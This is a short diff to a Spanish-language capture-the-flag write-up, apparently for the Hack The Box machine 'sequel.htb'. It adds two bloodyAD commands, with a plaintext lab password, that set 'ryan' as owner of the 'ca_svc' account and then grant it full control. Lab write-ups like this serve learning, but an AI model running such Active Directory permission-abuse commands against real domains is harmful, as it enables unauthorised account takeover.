@@ -288,3 +288,13 @@ Buscamos a un usuario que tenemos `pwned`
 En `Outbound Object control`
 ![[Pasted image 20260211202116.png]]
 
+Nos hacemos owned de `ca_svc` con el usuario `ryan`
+```shell
+bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+```
+
+Y después darle control total a `ryan`
+```shell
+bloodyAD -d sequel.htb --host 10.129.232.128 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+```
+
